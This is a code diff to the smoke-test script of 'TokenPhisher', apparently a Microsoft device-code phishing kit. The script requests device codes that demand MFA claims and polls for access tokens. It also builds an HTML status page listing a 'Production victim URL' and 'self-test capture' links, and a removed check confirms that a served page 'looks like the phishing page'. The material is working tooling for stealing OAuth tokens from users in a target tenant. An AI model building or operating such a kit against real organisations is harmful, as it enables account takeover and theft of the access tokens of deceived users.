@@ -8,47 +8,27 @@ import { parseArgs } from 'util';
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const CONFIG_JSON = path.join(__dirname, 'config.json');
 
-const COMMON_ENDPOINTS = {
+export const COMMON_ENDPOINTS = {
   tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
   deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
 };
 
-function pass(label, detail = '') {
-  console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
+export function publicUrl(config, pathname, rootDir = __dirname) {
+  const host = config.tlsHostname || 'localhost';
+  const scheme = config.testMode ? 'http' : 'https';
+  const port = config.testMode ? config.httpPort : config.httpsPort;
+  const defaultPort = config.testMode ? 80 : 443;
+  const portSuffix = port === defaultPort ? '' : `:${port}`;
+  const base = `${scheme}://${host}${portSuffix}`;
+  return `${base}${pathname}`;
 }
 
-function fail(label, detail = '') {
-  console.log(`  ✗ ${label}${detail ? ` — ${detail}` : ''}`);
+function resolveCertPath(certPath, rootDir) {
+  return path.isAbsolute(certPath) ? certPath : path.join(rootDir, certPath);
 }
 
-function loadConfig(configPath) {
-  if (!fs.existsSync(configPath)) {
-    throw new Error(`Config not found: ${configPath}. Run npm run setup first.`);
-  }
-  return JSON.parse(fs.readFileSync(configPath, 'utf8'));
-}
-
-function resolveCertPath(certPath) {
-  return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
-}
-
-function checkTlsFiles(config) {
-  if (config.testMode) {
-    pass('TLS skipped (testMode is true)');
-    return true;
-  }
-
-  let ok = true;
-  for (const key of ['keyFilePath', 'certFilePath']) {
-    const filePath = resolveCertPath(config[key]);
-    if (fs.existsSync(filePath)) {
-      pass(`Certificate file exists`, filePath);
-    } else {
-      fail(`Missing certificate file`, filePath);
-      ok = false;
-    }
-  }
-  return ok;
+function check(label, ok, detail = '') {
+  return { label, ok, detail };
 }
 
 async function fetchOpenId(tenant) {
@@ -60,18 +40,18 @@ async function fetchOpenId(tenant) {
   return response.json();
 }
 
-async function requestDeviceCode(config) {
+async function requestDeviceCode(oauthConfig) {
   const body = new URLSearchParams({
-    client_id: config.clientId,
-    scope: config.scopes,
+    client_id: oauthConfig.clientId,
+    scope: oauthConfig.scopes,
     claims: '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
   });
 
-  const response = await fetch(config.deviceCodeUrl, {
+  const response = await fetch(oauthConfig.deviceCodeUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
-      'User-Agent': config.userAgent,
+      'User-Agent': oauthConfig.userAgent,
     },
     body,
   });
@@ -95,18 +75,18 @@ async function requestDeviceCode(config) {
   return data;
 }
 
-async function pollOnce(config, deviceCode) {
+async function pollOnce(oauthConfig, deviceCode) {
   const body = new URLSearchParams({
     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
-    client_id: config.clientId,
+    client_id: oauthConfig.clientId,
     code: deviceCode,
   });
 
-  const response = await fetch(config.tokenUrl, {
+  const response = await fetch(oauthConfig.tokenUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
-      'User-Agent': config.userAgent,
+      'User-Agent': oauthConfig.userAgent,
     },
     body,
   });
@@ -114,16 +94,167 @@ async function pollOnce(config, deviceCode) {
   return response.json();
 }
 
-async function checkLiveUrl(url) {
-  const response = await fetch(url, { redirect: 'manual' });
-  const html = await response.text();
+async function testOAuthFlow(oauthConfig, label) {
+  const device = await requestDeviceCode(oauthConfig);
+  const poll = await pollOnce(oauthConfig, device.device_code);
 
-  if (response.status !== 200) {
-    throw new Error(`Expected HTTP 200, got ${response.status}`);
+  let pollDetail = JSON.stringify(poll);
+  if (poll.error === 'authorization_pending') {
+    pollDetail = 'authorization_pending (expected before login)';
+  } else if (poll.access_token) {
+    pollDetail = 'access_token returned';
   }
-  if (!html.includes('user_code') && !html.includes('readonly')) {
-    throw new Error('Response does not look like the phishing page (no code field found)');
+
+  return {
+    label,
+    deviceCodeUrl: oauthConfig.deviceCodeUrl,
+    userCode: device.user_code,
+    pollOk: poll.error === 'authorization_pending' || Boolean(poll.access_token),
+    pollDetail,
+  };
+}
+
+export async function runSmokeTests(config, { rootDir = __dirname } = {}) {
+  const checks = [];
+
+  checks.push(check('Config loaded', true, config.microsoftTenant || config.tlsHostname || 'ok'));
+
+  if (config.testMode) {
+    checks.push(check('TLS mode', true, 'testMode — HTTP only'));
+  } else {
+    for (const key of ['keyFilePath', 'certFilePath']) {
+      const filePath = resolveCertPath(config[key], rootDir);
+      checks.push(check(`TLS file: ${key}`, fs.existsSync(filePath), filePath));
+    }
   }
+
+  if (config.microsoftTenant) {
+    try {
+      const discovery = await fetchOpenId(config.microsoftTenant);
+      checks.push(
+        check('OpenID discovery', true, config.microsoftTenant),
+        check('tokenUrl matches discovery', config.tokenUrl === discovery.token_endpoint, discovery.token_endpoint),
+        check(
+          'deviceCodeUrl matches discovery',
+          config.deviceCodeUrl === discovery.device_authorization_endpoint,
+          discovery.device_authorization_endpoint
+        )
+      );
+    } catch (error) {
+      checks.push(check('OpenID discovery', false, error.message));
+    }
+  }
+
+  let production;
+  try {
+    production = await testOAuthFlow(config, 'Production tenant OAuth');
+    checks.push(check('Production device code', true, `user_code=${production.userCode}`));
+    checks.push(check('Production token poll', production.pollOk, production.pollDetail));
+  } catch (error) {
+    checks.push(check('Production device code', false, error.message));
+  }
+
+  let common;
+  try {
+    common = await testOAuthFlow({ ...config, ...COMMON_ENDPOINTS }, 'Common (/common/) OAuth');
+    checks.push(check('Common device code', true, `user_code=${common.userCode}`));
+    checks.push(check('Common token poll', common.pollOk, common.pollDetail));
+  } catch (error) {
+    checks.push(check('Common device code', false, error.message));
+  }
+
+  return {
+    ok: checks.every((item) => item.ok),
+    checks,
+    production,
+    common,
+    configSummary: {
+      tenant: config.microsoftTenant,
+      clientId: config.clientId,
+      tokenUrl: config.tokenUrl,
+      deviceCodeUrl: config.deviceCodeUrl,
+      testMode: config.testMode,
+    },
+  };
+}
+
+export function renderSmokeTestPage(results, urls) {
+  const rows = results.checks
+    .map(
+      (item) =>
+        `<tr class="${item.ok ? 'ok' : 'fail'}"><td>${item.ok ? '✓' : '✗'}</td><td>${escapeHtml(item.label)}</td><td>${escapeHtml(item.detail)}</td></tr>`
+    )
+    .join('');
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TokenPhisher Smoke Test</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1a1a1a; }
+    h1 { font-size: 1.4rem; }
+    table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+    td, th { border-bottom: 1px solid #ddd; padding: 0.5rem; text-align: left; vertical-align: top; }
+    tr.ok td:first-child { color: #0a7a2f; }
+    tr.fail td:first-child { color: #b00020; font-weight: bold; }
+    .card { background: #f6f8fa; border: 1px solid #d8dee4; border-radius: 8px; padding: 1rem; margin: 1rem 0; }
+    code, .mono { font-family: ui-monospace, monospace; font-size: 0.92rem; word-break: break-all; }
+    a { color: #0969da; }
+    .status { font-weight: 600; color: ${results.ok ? '#0a7a2f' : '#b00020'}; }
+  </style>
+</head>
+<body>
+  <h1>TokenPhisher smoke test</h1>
+  <p class="status">${results.ok ? 'All checks passed' : 'Some checks failed'}</p>
+
+  <table>
+    <thead><tr><th></th><th>Check</th><th>Detail</th></tr></thead>
+    <tbody>${rows}</tbody>
+  </table>
+
+  <div class="card">
+    <p><strong>Production victim URL</strong><br><a href="${escapeHtml(urls.victimUrl)}">${escapeHtml(urls.victimUrl)}</a></p>
+    <p><strong>Self-test capture</strong> (any Azure AD account you control, uses <code>/common/</code> endpoints)<br>
+    <a href="${escapeHtml(urls.selfTestUrl)}">${escapeHtml(urls.selfTestUrl)}</a></p>
+  </div>
+
+  <div class="card">
+    <p><strong>Production OAuth</strong></p>
+    <p class="mono">${escapeHtml(results.configSummary.deviceCodeUrl)}</p>
+    ${results.production ? `<p>Sample code issued: <code>${escapeHtml(results.production.userCode)}</code> (diagnostic only — not polling)</p>` : ''}
+    <p>Full capture requires a user in tenant <code>${escapeHtml(results.configSummary.tenant || 'configured tenant')}</code>.</p>
+  </div>
+
+  <div class="card">
+    <p><strong>Refresh this page</strong> to re-run checks: <a href="${escapeHtml(urls.smokeTestUrl)}">${escapeHtml(urls.smokeTestUrl)}</a></p>
+  </div>
+</body>
+</html>`;
+}
+
+function escapeHtml(value) {
+  return String(value ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function pass(label, detail = '') {
+  console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
+}
+
+function fail(label, detail = '') {
+  console.log(`  ✗ ${label}${detail ? ` — ${detail}` : ''}`);
+}
+
+function loadConfig(configPath) {
+  if (!fs.existsSync(configPath)) {
+    throw new Error(`Config not found: ${configPath}. Run npm run setup first.`);
+  }
+  return JSON.parse(fs.readFileSync(configPath, 'utf8'));
 }
 
 function printHelp() {
@@ -131,24 +262,16 @@ function printHelp() {
 
 Usage:
   node smoke-test.mjs [options]
+  Or visit /smoke-test while the server is running.
 
 Options:
   --config <file>     Config file (default: ./config.json)
-  --tenant <tenant>   Override tenant for OpenID check (common, organizations, or yourtenant.onmicrosoft.com)
-  --use-common        Use Microsoft /common/ endpoints for device-code test (any work tenant account)
-  --live-url <url>    Also fetch a running /share page (server must be up)
+  --live-url <url>    Also fetch a running page (server must be up)
   --help              Show this help
 
 Examples:
   npm run smoke-test
-  npm run smoke-test -- --use-common
-  npm run smoke-test -- --tenant contoso.onmicrosoft.com
-  npm run smoke-test -- --live-url https://share.example.com/share
-
-Testing without the client's tenant:
-  • --use-common uses generic endpoints; sign in with any Azure AD work account you control.
-  • Free M365 developer tenant: https://developer.microsoft.com/microsoft-365/dev-program
-    gives you *.onmicrosoft.com — run setup with --tenant yourtenant.onmicrosoft.com
+  npm run smoke-test -- --live-url https://share.example.com/smoke-test
 `);
 }
 
@@ -156,8 +279,6 @@ async function main() {
   const { values } = parseArgs({
     options: {
       config: { type: 'string', default: CONFIG_JSON },
-      tenant: { type: 'string' },
-      'use-common': { type: 'boolean', default: false },
       'live-url': { type: 'string' },
       help: { type: 'boolean', short: 'h', default: false },
     },
@@ -174,67 +295,40 @@ async function main() {
   const config = loadConfig(path.resolve(values.config));
   pass('Loaded config', values.config);
 
-  if (values['use-common']) {
-    Object.assign(config, COMMON_ENDPOINTS);
-    pass('Using /common/ OAuth endpoints (not client-tenant-specific)');
-  }
+  const results = await runSmokeTests(config, { rootDir: path.dirname(path.resolve(values.config)) });
 
-  if (values.tenant) {
-    console.log('\nOpenID discovery:');
-    const discovery = await fetchOpenId(values.tenant);
-    pass(`Tenant "${values.tenant}" reachable`);
-    console.log(`    tokenUrl: ${discovery.token_endpoint}`);
-    console.log(`    deviceCodeUrl: ${discovery.device_authorization_endpoint}`);
-    if (!values['use-common']) {
-      config.tokenUrl = discovery.token_endpoint;
-      config.deviceCodeUrl = discovery.device_authorization_endpoint;
+  for (const item of results.checks) {
+    if (item.ok) {
+      pass(item.label, item.detail);
+    } else {
+      fail(item.label, item.detail);
     }
-  } else if (config.microsoftTenant) {
-    pass('Config tenant', config.microsoftTenant);
-  }
-
-  console.log('\nTLS files:');
-  const tlsOk = checkTlsFiles(config);
-
-  console.log('\nOAuth device-code flow:');
-  console.log(`    deviceCodeUrl: ${config.deviceCodeUrl}`);
-  const device = await requestDeviceCode(config);
-  pass('Device code issued', `user_code=${device.user_code}`);
-
-  const poll = await pollOnce(config, device.device_code);
-  if (poll.error === 'authorization_pending') {
-    pass('Token polling works', 'authorization_pending (expected before login)');
-  } else if (poll.access_token) {
-    pass('Token polling works', 'access_token returned (already authenticated?)');
-  } else {
-    fail('Unexpected poll response', JSON.stringify(poll));
   }
 
   if (values['live-url']) {
-    console.log('\nLive page check:');
-    await checkLiveUrl(values['live-url']);
-    pass('Live /share page reachable', values['live-url']);
+    const response = await fetch(values['live-url']);
+    if (response.ok) {
+      pass('Live URL reachable', values['live-url']);
+    } else {
+      fail('Live URL reachable', `HTTP ${response.status}`);
+    }
   }
 
-  console.log('\nSmoke test complete.');
-  if (!tlsOk) {
-    console.log('Fix TLS issues above before production use.');
+  console.log(`\nSmoke test ${results.ok ? 'passed' : 'failed'}.`);
+  if (config.tlsHostname) {
+    console.log(`Web UI: ${publicUrl(config, '/smoke-test')}`);
+    console.log(`Self-test capture: ${publicUrl(config, '/smoke-test/self')}`);
+  }
+
+  if (!results.ok) {
     process.exit(1);
-  }
-
-  console.log('\nTo test a full capture yourself:');
-  if (values['use-common'] || config.deviceCodeUrl.includes('/common/')) {
-    console.log('  1. npm run setup -- --test-mode --tenant common   (or your .onmicrosoft.com tenant)');
-    console.log('  2. npm start');
-    console.log('  3. Visit /share and complete login with an account you control');
-  } else {
-    console.log('  1. Visit your Victim URL /share');
-    console.log('  2. Complete login at microsoft.com/devicelogin with a user in that tenant');
-    console.log('  3. Or re-run setup with --tenant common / your dev tenant for self-testing');
   }
 }
 
-main().catch((error) => {
-  console.error(`\nSmoke test failed: ${error.message}`);
-  process.exit(1);
-});
+const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
+if (isMain) {
+  main().catch((error) => {
+    console.error(`\nSmoke test failed: ${error.message}`);
+    process.exit(1);
+  });
+}
